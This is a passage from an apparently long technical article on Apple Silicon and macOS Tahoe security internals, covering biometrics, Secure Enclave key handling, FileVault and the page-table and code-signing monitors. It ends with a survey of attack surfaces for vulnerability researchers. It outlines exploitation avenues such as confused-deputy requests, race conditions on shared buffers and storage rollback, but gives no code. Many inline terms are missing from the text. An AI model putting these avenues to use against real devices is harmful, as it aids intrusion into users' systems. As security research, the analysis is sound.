it implements the system’s Local Authentication policy engine:Manages  instances and associates them with PIDs, ASIDs, and calling processes.Parses Keychain Access Control Lists (ACLs), evaluating requirements such as “biometry OR passcode” vs “biometry AND device unlock”.Implements the Access Control Module (ACM) logic that mirrors SEP-side decision structures: it constructs and validates the requests that will eventually be sent to the Secure Enclave.
Located at /usr/libexec/biometrickitd, it manages the physical biometric sensors: Loads device-specific plugins (e.g. Mesa for Touch ID, Pearl for Face ID, Jade for Optic ID).Power / state management: Controls sensor power, exposure, illumination hardware, and readiness. Sets up shared buffers or DMA configurations between the sensor hardware and the Secure Enclave via the kernel. It does not perform high-level biometric matching; it shuttles encrypted sensor output toward the SEP.A typical biometric request flows as follows:An app invokes -[LAContext evaluatePolicy:localizedReason:reply:].Validates the caller’s code signature, entitlements, and audit token (including ASID).Checks Keychain or system ACLs to decide whether biometry is acceptable for this operation.Creates an  structure representing this auth attempt. sends an XPC request to  to  the appropriate sensor.Issues  requests into the biometric kernel driver ( and relatives).The driver configures the sensor and a buffer that is shared with or visible to the Secure Enclave.The kernel signals the SEP via the mailbox that a biometric capture session is ready and provides the buffer references.At that point, the SEP takes over capture, matching, and decision logic; userland daemons observe state transitions and present UI, but never see raw biometric templates.10.2.2 The Hardware Path: Sensor-to-SEP PairingA critical security property of the biometric stack is  between the sensor module and the Secure Enclave.During manufacturing and repair-authorization procedures:The biometric sensor module (Touch ID button, TrueDepth camera system, Optic ID array) and the SEP perform a pairing protocol.A shared secret is established and stored:In the sensor’s controller.In SEP-managed internal storage (e.g. xART).When a biometric capture occurs:The sensor acquires raw data (fingerprint ridge map, IR depth map, iris texture).The sensor hardware encrypts this data using keys derived from the pairing secret before putting it on the bus.The encrypted payload travels over SPI/MIPI to the Application Processor.The biometric kernel driver writes the encrypted blob into a region of memory that is readable by the SEP.The SEP reads the blob, decrypts it using the pairing key, and performs all further processing internally.From the AP’s perspective, these buffers contain high-entropy ciphertext. Dumping them from the kernel or an I/O trace yields no usable biometric image data.Two empirically observable consequences:Swapping a Touch ID or Face ID module between devices without running Apple’s pairing tools causes biometric functions to fail: the SEP can no longer decrypt sensor output.Hooking the biometric driver stack and dumping in-flight data shows encrypted blobs rather than structured images, confirming that matching happens exclusively inside the SEP / SNE domain.10.2.3 The Secure Neural Engine (SNE) & Optic IDFace ID and Optic ID push biometric matching beyond the capabilities of the general-purpose SEP core. To handle these workloads, Apple partitions the  into:A  – accessible to userland via Core ML.A  – a slice reserved for the Secure Enclave, sometimes referred to as the Secure Neural Engine (SNE).Optic ID Flow (Tahoe / Vision Pro)At a high level, an Optic ID authentication proceeds as follows:
The dedicated Optic ID cameras capture spatiotemporally modulated IR images of the user’s eyes.
As with Touch ID and Face ID, the raw frames are encrypted at the sensor and written as ciphertext into memory visible to the SEP.Ensures that the portion of the Neural Engine allocated for secure use is scrubbed and placed under the control of its memory protection regime.Loads the Optic ID neural network model and associated parameters.
The SEP feeds the encrypted image data through the secure ANE slice:The SNE produces feature vectors representing the iris and surrounding structures.
The SEP compares the feature vector against stored templates in its  (xART-backed), applying thresholds, quality checks, and policy (user presence, recent activity, etc.).
In parallel, the SEP uses the spatiotemporal pattern of IR illumination and pupil response to distinguish live tissue from static imagery or contact-lens attacks.On recent Apple Silicon generations:The memory used for SEP-private and SEP–SNE-shared computations is protected by the Secure Enclave’s .Observers outside the SEP domain (including the AP and hypervisors) see encrypted and authenticated data when they attempt to read those regions.Biometric templates and intermediate neural activations never appear in plaintext outside the Secure Enclave trust boundary.Dumping DRAM does not expose Optic ID templates or models in a directly usable form.10.2.4 Secure Intent: The GPIO HardlineFor high-value transactions (Apple Pay, high-assurance key operations), Apple requires more than “biometric match.” Malware could, in principle, trick the user into satisfying a biometric prompt while a hidden transaction is in flight.To address this, Apple implements  as a physical side channel into the SEP.The side/top/power button is wired not only to the Application Processor and Always-On Processor (AOP), but also via a dedicated signal path to the Secure Enclave.This signal path allows the SEP to independently observe specific button gestures (e.g. double-click).When a transaction is marked as requiring secure intent (via LocalAuthentication / Apple Pay policy):The SEP performs the biometric match as usual.On success, instead of immediately unwrapping or signing with the relevant key, the SEP:Records that a biometric match is pending for a secure-intent operation.Starts a short internal timer window.The SEP monitors its dedicated button line for the required gesture (e.g. double-click within a given time bound).Only if both conditions are satisfied:Recent acceptable biometric match.Correct physical button gesture within the window.
does the SEP:Release the Apple Pay token.Unwrap or use the key required for the operation.From an attacker’s perspective:UI spoofing (e.g. drawing a fake “Double Click to Pay” overlay via ) cannot produce the electrical signal on the SEP’s dedicated line.Even full compromise of the AP and WindowServer stack cannot bypass secure intent without either:Inducing the user to perform the real physical gesture at the right time, orCompromising the SEP itself.10.2.5 The Local Authentication Context (LAC) and Token BindingWhen authentication succeeds, the SEP does not simply return  / . It returns or maintains  that is later used to authorize specific operations.Internally,  and related components track an opaque handle (often modeled as an ) associated with:The LAContext created for the app.The factor that succeeded (passcode vs. biometry).Relevant policy state (device lock state, secure intent, etc.).This handle is then passed to other system components that need to prove “recent successful user presence” without re-prompting.Keychain and token bindingFor a Keychain item protected by kSecAccessControlUserPresence or a similar policy:The client invokes a Keychain operation. (the Keychain daemon) verifies that it has a suitable  or triggers  to obtain one.The encrypted keyblob (wrapped key).The  or equivalent context.
to the SEP.The handle is checked for validity and freshness (time bounds, lock state, backoff).If valid, the SEP uses its internal keys to unwrap the keyblob.Depending on the item’s protection:The unwrapped key may be returned to  (for extractable keys).Or the SEP may perform the cryptographic operation internally (for non-extractable keys).In all cases, the AP never gains the ability to “forge” recent user presence; it can only present handles that the SEP previously issued.The SEP enforces retry and lockout policy in hardware:Failed biometric attempts increment counters stored in SEP-protected storage (e.g. xART).After a small number of failures, delays are introduced between attempts.After a bounded number of failures (e.g. five for Face ID / Touch ID), biometric authentication is disabled until the user enters the passcode or password.Time-based rules (such as requiring a passcode after a certain period since last unlock or since last passcode entry) are also enforced by SEP logic rather than the AP.The exact thresholds and timing are encoded in  and evolve across OS generations, but the important property is that they are  under kernel or userland control.10.3 Data Protection & FileVaultOn Intel Macs, FileVault was implemented as a distinct full-disk encryption layer (CoreStorage) that sat below the filesystem. On Apple Silicon, this layering has collapsed into a unified  model:Every file on the APFS volume is encrypted with a per-file key.Per-file keys are wrapped by .Class keys are stored in  that are managed by the Secure Enclave.“Turning on FileVault” primarily changes how the Volume Encryption Key (VEK) is protected: from “effectively UID-only” to “UID plus user secret (password) and system measurement (SKP).”In macOS Tahoe, the Data Protection model from iOS is carried over almost verbatim and extended with Mac-specific SKP and policy machinery.10.3.1 Unwrapping the User Keybag: The Class Key HierarchyThe central on-disk structure for Data Protection is the :A binary property list stored in system-managed locations (paths vary with OS releases and boot volume layout).Contains  and metadata.Is always consumed by the SEP; the kernel never sees cleartext class keys.
A device-unique AES key, fused into the Secure Enclave and never exposed outside it.User password / passcode:
The logical secret known to the user and entered at login or unlock time.Passcode-derived key (PDK):
The SEP mixes:A KDF over the password plus salt (PBKDF2-like).Policy-dependent inputs (e.g. SKP measurement).
Conceptually:PDK = Tangle( UID, PBKDF2(password, salt), measurement, policy )
The exact KDF and tangling function are implementation details, but the key property is: PDK cannot be derived off-device.
The keybag stores wrapped class keys corresponding to the Data Protection classes:Class A (“Complete Protection”):
Data only accessible while the device is unlocked. Keys are evicted from SEP memory when the device locks.Class B (“Protected Unless Open”):
Similar to Class A, but open file handles may retain ephemeral context to allow certain operations to complete in the background.Class C (“Protected Until First User Authentication” / “First Unlock”):
Keys are brought into SEP memory after the first successful unlock and persist (subject to policy) until reboot. FileVault’s VEK is conceptually associated with this class on Apple Silicon Macs.Class D (“No User Secret” / “UID-only”):
Keys wrapped solely by the UID (and SKP where applicable). Used for data that must be accessible before user login (e.g. some system daemons and metadata). On Apple Silicon, user data is generally not assigned to Class D.When a user logs in on a FileVault-enabled Apple Silicon Mac: submits the password through the authentication pipeline; upon acceptance, the kernel passes:The supplied password (or a derivative).
to the SEP via AppleSEPKeyStore.The password is run through the configured KDF.The UID key and measurement inputs are combined via the tangling function to derive the PDK.The keybag’s wrapped class keys are unwrapped using the PDK and UID.The unwrapped class keys remain resident only inside SEP-protected memory.The SEP returns  (numeric identifiers or similar) for the class keys to the kernel rather than the keys themselves.Subsequent file I/O and volume operations refer to class keys by these handles, never by raw key bits.10.3.2 Sealed Key Protection (SKP): Binding Data to MeasurementTahoe introduces and extends Sealed Key Protection (SKP) as a defense against “Evil Maid” scenarios where an attacker boots a compromised or downgraded OS to attack the disk encryption keys.The Secure Enclave’s  verifies and measures .The LocalPolicy describing boot and security configuration (e.g. SIP, boot policy, secure boot level).These measurements are accumulated into internal registers within the SEP (conceptually similar to TPM PCRs, but not exposed as such).When the Volume Encryption Key (VEK) and class keys are created (e.g. at install or FileVault enablement time), they are wrapped under a key derived from:The passcode-derived material (PDK).The current boot-chain measurement.KEK = KDF( UID, PDK, Measurement )
WrappedVEK = Encrypt( VEK, KEK )
The same derivation is repeated inside the SEP using the current Measurement.If the OS, LocalPolicy, or relevant firmware has changed in a way that alters the Measurement beyond allowed ranges, the derived KEK will be different and the unwrap will fail—even if the correct password is supplied.To successfully decrypt the data volume, an attacker must:Possess the user’s secret (or otherwise satisfy SEP policy).Boot into an OS configuration that produces an acceptable Measurement (signed, authorized kernel + LocalPolicy consistent with SKP policy).Run on the original or equivalently provisioned hardware (UID key, SEP state).Downgrades to vulnerable kernels, custom kernels, or off-device keybag attacks are blocked at the SKP layer.10.3.3 The Hardware AES Engine & the Wrapped-Key PathA common misconception is that the macOS kernel decrypts file contents. On Apple Silicon, the encryption/decryption of user data is handled by a dedicated  on the SoC, integrated with the memory and storage controllers.When a user process performs a file read:
The APFS driver consults file metadata to obtain:The identifier or handle for the per-file key (wrapped).The relevant class key handle for this file.
The kernel sends:The wrapped per-file key.The class key handle.
to the SEP via AppleSEPKeyStore.Unwraps the per-file key using the class key resident in SEP memory.Programs the SoC’s AES engine with the resulting key via an internal, non-CPU-addressable interface; orRe-wraps the per-file key under an ephemeral engine-only key and passes that to the AES engine.
The kernel issues a read from the NAND-backed storage through the ANS/AGS storage controller, referencing the relevant blocks.
As data flows through the storage path into DRAM:The AES engine decrypts the ciphertext using the key material that was just programmed.The decrypted plaintext is written into the page cache.
The AES engine’s key state is ephemeral and tightly scoped to the I/O operation. The AP never sees the cleartext per-file key; the SEP holds the root class keys and controls when engine keys exist.Forensics and offensive implications:Dumping kernel memory will reveal plaintext file contents (resident in the page cache) but not the keys that decrypted them.Per-file and class keys exist only inside the SEP and (transiently) in engine-private state.Recovering those keys requires either:Compromising the SEP firmware and dumping its internal state (e.g., SRAM, xART).Attacking the AES engine at the hardware level.10.3.4 RE Focus: Analyzing the  Kernel ExtensionThe primary interface between the kernel and the SEP’s key-management logic is the  kernel extension. For Tahoe and Apple Silicon, this binary is the focal point for understanding the proprietary AP ↔ SEP protocol.Key responsibilities (RE-derived)Typical symbols and responsibilities observed across releases include: / related functions:Accept wrapped keys (e.g. from keybags, per-file metadata).Prepare and send unwrap requests to the SEP.Return handles or status to callers in the kernel. / equivalents:Query the SEP for the current lock / unlock state and biometric backoff state.Update kernel-side views of whether user data should be considered accessible.Message demultiplexers (e.g. sep_key_store_client_handle_message):Parse TLV-encoded responses from the SEP.Dispatch them to the correct waiters in the kernel or userland.From a reverse-engineering and exploitation perspective, several patterns emerge:
Keys are referred to by relatively small integer handles in the kernel. Bugs that cause handles to be mis-associated across security domains (system vs. user, different users, different contexts) could allow an attacker to induce the SEP to use a more privileged key than intended. maintains shadow state about lock status, key availability, and pending operations. Any discrepancy between this state and the SEP’s internal view could create TOCTOU-style conditions where:The kernel believes an operation is permitted, but the SEP does not (and vice versa).A key handle is assumed valid when the SEP has already invalidated it.
The AP-side parser for SEP messages handles complex TLV structures. Memory-safety bugs or logic errors here represent a classic attack surface, albeit one increasingly hardened by modern CFI, PAC, and mitigation layers.Tahoe hardening (observed)On Tahoe-era builds, interactions between  and higher-privilege operations (e.g., enabling FileVault, changing recovery keys, altering LocalPolicy-bound state) show evidence of:Additional checks that correlate key operations with TXM / GL1 policy decisions.Stricter coupling between “is this operation permitted under the current Measurement and LocalPolicy?” and “should this unwrap / key creation be forwarded to the SEP?”Public documentation does not yet spell out this coupling, but runtime traces and binary analysis strongly suggest that Apple is moving more of the authorization logic  the kernel and into the measured, SEP-adjacent policy domain.11.0 Conclusion: The Attack Surface LandscapeThe architectural transformation introduced with macOS Tahoe and the M3/M4 silicon generation signifies the end of the "Kernel is King" era. We have moved from a monolithic trust model, where  and  were the ultimate objectives, to a federated security model where the kernel is merely a highly privileged, yet strictly supervised, tenant within a hardware-enforced hypervisor.For the vulnerability researcher, this necessitates a shift in methodology. Fuzzing syscalls is no longer sufficient to compromise the system's root of trust. The new frontier lies in the —the specific, hardware-mediated bridges that allow data and execution flow to traverse the isolated domains.11.1 Summary of Boundary CrossingsThe following matrix details the architectural boundaries, the mechanisms used to traverse them, and the specific attack surface exposed at each junction.11.1.1 Userland (EL0) ↔ Kernel (EL2/VHE)The Traditional Boundary, Hardened by Silicon. (Supervisor Call) instruction triggering a synchronous exception to the kernel exception vector (, or the EL2 alias under VHE on macOS). (Exception Return) restoring  and  from / and / (depending on the concrete VHE configuration). Entry points are signed. The kernel verifies the thread state signature () on return, ensuring return-address and register integrity. The kernel cannot modify its own text or page tables to disable SMEP/SMAP equivalents (/). Page-table integrity and code immutability are ultimately enforced by the SPTM rather than by EL2 alone.The kernel is no longer the final arbiter of virtual memory. When a user process requests , the kernel cannot simply write to the translation tables; it must request the  to map the page. Standard memory corruption (UAF, heap overflow) in kernel extensions still yields privileged kernel execution in the EL2/VHE context. Forging pointers to survive the  path or function-pointer authentication (return addresses, vtables, dispatch tables). The kernel must sanitize user pointers and lengths before passing them to the SPTM. A "Confused Deputy" attack where the kernel is tricked into asking the SPTM to map a privileged page into user space is the new .11.1.2 Kernel (EL2) ↔ Secure Page Table Monitor (GL2)The "Mechanism" Boundary: The New Hypervisor. (Opcode ) with the  in  (encoding Domain + Dispatch Table ID + Endpoint). The 5-bit immediate in the  instruction selects the GXF entry stub and is recorded in . (Opcode ), returning from GL2 to the kernel’s EL2/VHE context. Hardware context switch of / →  and the corresponding GL2 state (, , ). Atomic switch of permission views. Kernel text becomes RO/NX from the GL2 perspective; SPTM text/data become RX/RW as configured for GL2 and remain inaccessible from EL2.– carry arguments (physical page numbers, ASIDs, permission bitmasks, context IDs).  carries the dispatch target ( + table + endpoint). None in the normal call path. The SPTM reads and writes physical memory directly via its own linear map and page-table view. The SPTM enforces a Finite State Machine (FSM) on every physical page (Frame Table). The primary attack vector is finding a sequence of // calls that desynchronizes the SPTM’s view of a page from the hardware’s actual usage (e.g., aliasing a  frame as ). Passing invalid physical addresses, truncated ranges, or edge-case permission combinations to //, especially under high contention or refcounted/shared-frame scenarios. Because invalid or inconsistent requests cause the SPTM to return fatal errors that XNU treats as unrecoverable and converts into kernel panics, timing side-channels or fault-injection during the  window are potential vectors to infer GL2 layout and state (e.g., distinguishing “valid but denied” vs “structurally impossible” transitions via differing panic paths or latencies).11.1.3 Kernel (EL2) ↔ Trusted Execution Monitor (TXM)The “Policy” Boundary: Code-Signing and Entitlement Authority. XNU invokes TXM through  and related wrappers. These routines set up a dedicated TXM stack, marshal a call descriptor (selector, argument vector, return buffer), and then perform the CPU sequence required to enter the TXM context. On current iOS releases, reverse-engineering shows that TXM itself uses  to perform in-monitor calls; on Tahoe, the interface exposed to XNU is via these  entry points rather than a raw  stub. TXM writes its result into the call descriptor, updates a status field, and returns to XNU, which interprets the status. Depending on selector and flags, some TXM failures are converted into kernel panics. TXM resides in a region whose code and data are owned and typed by SPTM. XNU has no direct write access to TXM text or critical data; changes must go through SPTM retyping and mapping operations. Apple’s OS integrity documentation describes TXM as a lower-privilege component used by SPTM to enforce code-signing and integrity policy. Even if TXM were compromised, SPTM still mediates page-table updates and frame typing; memory integrity does not collapse automatically. XNU passes pointers (or physical addresses) to Code Directories, CMS blobs, trust caches, and entitlement structures, along with lengths and flags. TXM interprets these structures and returns accept/deny decisions plus auxiliary metadata.Dynamic Trust Cache Operations: TXM selectors cover registration and removal of trust-cache entries, enabling or disabling specific code-signing relaxations, and managing development/debug modes. TXM must parse Mach-O headers, CodeDirectories, CMS/ASN.1, entitlements, and various policy structures. Bugs in these parsers can yield powerful policy-manipulation primitives (for example, arbitrary trust-cache entries or coerced acceptance of malformed signatures), but SPTM still constrains what memory mappings are possible.Policy Downgrade and LocalPolicy Handling: Incorrect handling of boot arguments and LocalPolicy data can cause persistent relaxation of code-signing or integrity checks. Exploits here influence what code TXM authorizes, but do not directly grant the ability to arbitrarily rewrite protected frames without also influencing SPTM. If the buffers that TXM inspects are not retyped or otherwise shielded by SPTM, there is a window where DMA or kernel code could mutate them between TXM’s checks and subsequent use. Correct integration of SPTM retyping with TXM’s parsing determines how exploitable such races are.11.1.4 Kernel (EL1) ↔ Secure Enclave (SEP)The "Air Gap" Boundary: The Parallel Computer. Mailbox Registers (Doorbell) + Shared Memory Buffers (DART-mapped). Distinct CPU core, distinct MMU.Memory Protection Engine: SEP memory is encrypted/authenticated inline. L4 IPC format (Endpoints, TLV payloads). Keys are passed as opaque blobs; raw key material never crosses this boundary. Fuzzing the  endpoint handlers (e.g., , ). Modifying the contents of a DART-mapped buffer after the SEP has validated the header but before it processes the payload. Attempting to rollback the  storage state to force the SEP to reuse old nonces or counters.11.1.5 Kernel (EL1) ↔ Exclaves (Secure Domain)The "Microkernel" Boundary: The RingGate. kext marshals data →  (to Secure Kernel) → IPC to Conclave. Enforces physical memory isolation between  and . A strongly-typed IDL serialization format. Exploiting  to route messages to the wrong Conclave. Bugs in the Tightbeam generated code within the Exclave. Flooding the Secure Kernel with Downcalls to starve secure workloads (DoS).11.2 The "Intel Gap": Security Disparities between x86 and Apple SiliconWhile macOS Tahoe presents a unified user experience across architectures, the underlying security reality is a tale of two operating systems. On Apple Silicon, macOS is a hypervisor-managed, hardware-attested fortress. On Intel (x86_64), it remains a traditional monolithic kernel relying on legacy protection mechanisms. This divergence has created a massive "Intel Gap"—a disparity in exploit mitigation so severe that the same vulnerability often yields a trivial root shell on Intel while resulting in a harmless panic on Apple Silicon.For the reverse engineer, understanding this gap is essential for targeting. The Intel architecture represents the "Soft Target," lacking the silicon-enforced boundaries of the SPTM, TXM, and PAC.11.2.1 Lateral Privilege: GL2 vs Ring 0The critical difference between Intel and Apple-silicon Tahoe systems is the existence, on Apple silicon, of a privilege layer  the kernel that continues to enforce memory-integrity invariants even after a kernel compromise.XNU runs at EL2 under the supervision of SPTM in GL2. SPTM is the sole authority for page-table retyping and for managing frame types that correspond to kernel text, page tables, IOMMU tables, and other critical regions.TXM executes in a lower-privilege domain than SPTM and provides code-signing and integrity policy decisions. SPTM calls into TXM to decide whether particular mappings or code images are acceptable, but SPTM remains the arbiter of what is actually mapped and how frames are typed.A kernel exploit that yields KRW in XNU provides strong influence over control flow and data within EL2 and allows attempts to mis-use SPTM/TXM as confused deputies. However, the attacker must still either:Drive SPTM through an illegal but accepted state transition (retyping or mapping), orGain sufficient influence over TXM and then exploit the TXM–SPTM interface,
to obtain equivalent authority over page tables and sealed code.The kernel runs in Ring 0 and directly controls page tables, VT-d configuration, and most integrity mechanisms below the T2’s secure boot checks.There is no SPTM-equivalent hypervisor above Ring 0 enforcing frame typing or page-table integrity at runtime. Once KRW is obtained and static KTRR is bypassed or worked around, the attacker can patch kernel text, alter page tables, and reconfigure DMA mappings with no higher-privilege arbiter.Under this model, KRW on Apple silicon is an intermediate privilege level situated below SPTM/TXM, whereas KRW on Intel is much closer to the maximum privilege available to macOS.11.2.2 Static vs. Dynamic Kernel Integrity (KTRR vs. SPTM)Both architectures attempt to enforce Kernel Text Read-Only Region (KTRR), but the implementation differs fundamentally in flexibility and robustness. On recent Intel Macs, KTRR is implemented via proprietary memory controller registers (configured via ).
 The firmware locks a physical range of memory as Read-Only/Executable. This is . Once the range is locked at boot, it cannot change. This forces the kernel to fit all immutable code into a contiguous block. It cannot protect dynamically loaded drivers (KEXTs) with the same hardware rigor. KEXTs rely on software-managed page tables ( bit), which a compromised kernel can disable. The SPTM manages the Frame Table. This is . The kernel can load a new extension (AKC), link it, and then ask the SPTM to "Seal" it. The SPTM transitions those specific pages to . This allows the "Immutable Kernel" coverage to extend to late-loaded drivers, a feat impossible on the static Intel KTRR implementation.11.2.3 The CFI Chasm: PAC vs. CETControl Flow Integrity (CFI) is the primary defense against ROP/JOP.Pointer Authentication (PAC) is ubiquitous. It protects return addresses (stack), function pointers (heap/data), and C++ vtables. It provides cryptographic diversity based on pointer context. Intel Macs support Control-flow Enforcement Technology (CET), specifically Shadow Stacks ( support is limited).
 CET Shadow Stacks protect return addresses effectively, but they do not protect  transfers (function pointers) with the same granularity as PAC. Crucially, Intel has no equivalent to  (Data Key). An attacker on Intel can still perform Data-Oriented Programming (DOP)—swapping valid object pointers or corrupting decision-making flags—without triggering a hardware fault. On Apple Silicon, these pointers are signed; forging them requires a signing gadget.11.2.4 The Root of Trust: T2 vs. On-Die Boot ROMThe boot chain trust anchor differs physically. The Root of Trust is the  (on models 2018-2020).
 The T2 is a discrete bridge. It verifies the  and kernelcache signature  the Intel CPU starts. However, once the Intel CPU is executing, the T2 is effectively a peripheral connected via USB/PCIe. It cannot introspect the Intel CPU's execution state. It cannot stop a runtime kernel exploit. The Root of Trust is the .
 The security logic (SEP, PKA, Boot Monitor) is on the . The Secure Enclave can monitor the power and clock lines of the AP. The SPTM (running on the AP) enforces the boot measurements continuously. The trust chain is not "handed off"; it is maintained throughout the runtime lifecycle.11.2.5 I/O Security: VT-d vs. DARTDMA attacks are a classic method to bypass CPU memory protections. Uses  (Intel Virtualization Technology for Directed I/O).
 The kernel configures the IOMMU tables. If the kernel is compromised, it can reconfigure VT-d to allow a malicious Thunderbolt device to overwrite kernel memory (unless strict "DMA Protection" is enabled and locked, which relies on the kernel's integrity). Uses  (Device Address Resolution Table).
 As detailed in Section 7.2.2, the kernel  write to DART registers. Only the SPTM can map I/O memory. Even a compromised kernel cannot weaponize a peripheral to perform a DMA attack against the monitor or the kernel text, because the SPTM will reject the mapping request.11.2.6 Summary Table: Tahoe on Intel vs Apple SiliconApple Silicon (arm64e, Tahoe)Highest effective privilegeRing 0 kernel with static KIP/KTRR; no higher-privilege macOS component supervising runtime mappingsGL2 SPTM as top-level memory arbiter supervising EL2 XNU; TXM runs below SPTM and supplies code-signing and integrity policy that SPTM consumes for protected mappingsMemory-controller KIP + software-managed page tables; VT-d tables configured by the kernelSPRR + SPTM-mediated retyping and mapping for page tables and DART; kernel cannot directly repoint protected framesStatic KTRR region for core kernel text; many KEXTs rely on page-table flags that the kernel can modifyDynamic sealing of XNU text and AKCs via SPTM/KIP; additional code cannot be introduced as  after boot without passing SPTM’s frame-typing rulesCET (Shadow Stack + IBT) available in hardware; extent of macOS use is not publicly documentedPAC on kernel and userland code, including return addresses and many vtablesVtable / data-pointer protectionNo hardware authentication for data pointers or vtablesPAC on vtables and selected data pointers (DA/GA keys) constrains many forward-edge and DOP-style attacksAMFI / CoreTrust in the kernel enforce policy; T2 participates in secure boot but does not supervise runtime kernel mappingsTXM, running in a domain protected by SPTM, evaluates signatures and integrity policy. On iOS-class platforms, TXM/SPTM together enforce “only signed and trusted code executes”. On macOS, TXM/SPTM primarily protect page-tables and protected code regions while still allowing arbitrary user code execution in accordance with macOS policy.VT-d configured and updated by the kernelDART configured via SPTM dispatch; IOMMU tables live behind SPTM’s frame-typing and mapping rulesSecure enclave / secure coprocessorDiscrete T2 SoC linked over internal buses; cannot introspect x86_64 execution after hand-offSEP on-die with AP; Exclaves and other secure domains use the same silicon fabric and SPTM/TXM-supervised interfacesTypical kernel-exploit consequenceKRW + KTRR bypass ⇒ direct and persistent kernel modification and DMA reconfigurationKRW in XNU ⇒ strong EL2 foothold; additional steps against SPTM/TXM/Exclaves are required to influence sealed code or protected page tables, especially for persistence or for changing hardware-enforced invariantsConclusion for the Researcher:
The "Intel Gap" means that legacy Intel Macs are essentially running a different, far more vulnerable operating system, despite sharing the macOS version number. Exploits that require complex, multi-stage chains on M3 (e.g., bypassing PAC, confusing SPTM, racing TXM) can often be reduced to a single Use-After-Free and a ROP chain on Intel. As Apple phases out Intel support, the "easy mode" of macOS exploitation is rapidly vanishing.11.3 Future Trends: The expansion of Exclaves and the death of Kernel ExtensionsThe trajectory of macOS security architecture is not asymptotic; it is directional. Apple is not merely patching vulnerabilities in XNU; they are actively architecting its obsolescence as a security boundary. The "Tahoe" architecture provides the silicon primitives (SPTM, TXM, GL2) required to execute a long-term strategy of .The future of macOS exploitation lies in understanding two concurrent trends: the ossification of the XNU kernel into a static, immutable appliance, and the migration of high-value logic into the opaque, hardware-isolated world of Exclaves.11.3.1 The Deprecation of : The Static KernelFor decades, the ability to load Kernel Extensions (KEXTs) was a defining feature of macOS. It was also its Achilles' heel. KEXTs run at EL1, share the kernel's address space, and historically lacked the rigorous code review applied to the core kernel.The mechanism for this—the  syscall (and the associated  traps)—represents a massive attack surface. It requires the kernel to possess a runtime linker (), capable of resolving symbols, applying relocations, and modifying executable memory.
Apple has systematically introduced userland replacements for kernel drivers: , , , and . In Tahoe, third-party KEXTs are deprecated. The userland tool  manages the policy, but the actual loading still relies on the kernel's ability to link code. Loading a legacy KEXT now requires reducing system security (disabling SIP/Secure Boot) and interacting with the  via  to explicitly authorize the hash.Future State: The Death of the Runtime Linker:
We are approaching a point where the kernel will effectively lose the ability to load dynamic code entirely in "Full Security" mode. The goal is to remove the  logic from the kernel entirely. The Boot Kernel Collection (BKC) (loaded by iBoot) and the Auxiliary Kernel Collection (AKC) (loaded early by ) will be the  permitted executable kernel code. By moving all linking to build-time (kernelcache generation) or boot-time (iBoot verification), Apple can strip the dynamic linker logic () from the runtime kernel. If the kernel doesn't know how to link a Mach-O, it cannot load a rootkit. The  already enforces that  is immutable. The logical next step is for the SPTM to reject  request that attempts to create new  pages after the initial boot sealing phase is complete.
The era of the "Rootkit" is ending. If you cannot introduce new code into EL1 via , and you cannot modify existing code due to KTRR/SPTM, persistence in the kernel becomes impossible. Attackers will be forced to live entirely within data-only attacks (DOP) or move their persistence to userland (which is easier to detect) or firmware (which is harder to achieve).11.3.2 Exclave Expansion: Eating the MonolithIf XNU is the "Insecure World," Exclaves are the "Secure World." Currently, Exclaves are used for high-sensitivity, low-complexity tasks (Privacy Indicators, Passkeys). However, the architecture is designed to scale. Apple is effectively strangling the monolithic kernel by slowly migrating critical subsystems out of EL1 and into Exclaves.Candidates for Migration:The Network Stack ():
Apple has already introduced , a userland networking subsystem. The logical evolution is to move the TCP/IP stack and packet filtering logic into an Exclave.
 A remote code execution vulnerability in the Wi-Fi firmware or the TCP stack would compromise an isolated Exclave, not the entire kernel. The SPTM would prevent the compromised network stack from touching system memory.Filesystem Encryption (APFS):
Currently,  handles key wrapping, but the bulk encryption happens via the AES Engine managed by the kernel. Moving the filesystem driver's cryptographic logic to an Exclave would ensure that even a kernel compromise cannot exfiltrate file keys, as the keys would exist only within the Exclave's memory domain.Audio and Media Processing:
To protect DRM content and prevent microphone eavesdropping, the entire CoreAudio engine could be moved to a "Media Conclave."
As more logic moves to Exclaves, a significant portion of the OS execution flow becomes invisible to standard introspection tools. You cannot DTrace an Exclave. Kernel tracing will show a "black hole" where the request enters  and vanishes until the result returns. The memory of an Exclave is physically unmappable by the kernel. A kernel memory dump (coredump) will contain gaps where the Exclave memory resides.11.3.3 The "Hollow Kernel" HypothesisExtrapolating these trends leads to the .In this future architecture, XNU (EL1) is demoted to a . Its primary role is to:Provide POSIX system call semantics for legacy userland applications.Manage coarse-grained scheduling of CPU resources.Act as a message bus (via ) between userland applications and the real system logic running in Exclaves.
In the traditional model, the Kernel protects the User. In the Hollow Kernel model, the Hardware (SPTM/TXM) protects the System from the Kernel.The kernel is treated as untrusted code.The TCB (Trusted Computing Base) shrinks from "The entire Kernel" to "The SPTM, TXM, and specific Exclaves."A kernel compromise becomes a "Local DoS" or "Privacy Violation" rather than a "System Compromise."11.3.4 The Visibility Gap: The End of Passive AnalysisFor the reverse engineer, this shift is catastrophic for visibility. The interface between XNU and Exclaves is defined by Tightbeam. Unlike MIG, which was relatively static, Tightbeam protocols can evolve rapidly. Reverse engineering the system will require constantly reconstructing these serialization formats. As Apple phases out Intel support completely, they will likely remove the legacy code paths in XNU that supported the "un-isolated" model. This will make the kernel source code (if still released) increasingly divergent from the binary reality running on M-series chips.Hardware-Locked Debugging: Debugging an Exclave likely requires "Red" (Development) fused silicon. Researchers working on retail "Green" (Production) hardware will be effectively locked out of analyzing the internal logic of these secure subsystems, forced to treat them as black boxes and fuzz their inputs via .
macOS is no longer just a Unix system. It is a distributed system running on a single die, governed by a hypervisor that doesn't exist in software. The kernel is dead; long live the Monitor.]]></content:encoded></item><item><title>ISC Stormcast For Monday, November 24th, 2025 https://isc.sans.edu/podcastdetail/9712, (Mon, Nov 24th)</title><link>https://isc.sans.edu/diary/rss/32516</link><author></author><category>threatintel</category><pubDate>Mon, 24 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Code Injection Flaws Threaten NVIDIA’s Isaac-GROOT Robotics Platform</title><link>https://securityonline.info/code-injection-flaws-threaten-nvidias-isaac-groot-robotics-platform/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 01:52:38 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
